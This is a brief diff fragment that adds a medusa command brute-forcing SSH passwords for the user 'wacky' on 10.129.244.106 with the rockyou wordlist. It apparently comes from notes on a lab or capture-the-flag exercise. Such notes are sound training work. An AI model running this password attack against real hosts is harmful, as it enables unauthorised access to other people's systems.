@@ -1,5 +1,9 @@
 ```
-
+medusa -u wacky \
+       -P /usr/share/wordlists/rockyou.txt \
+       -h 10.129.244.106 \
+       -M ssh \
+       -n 22
 ```
 
 ```
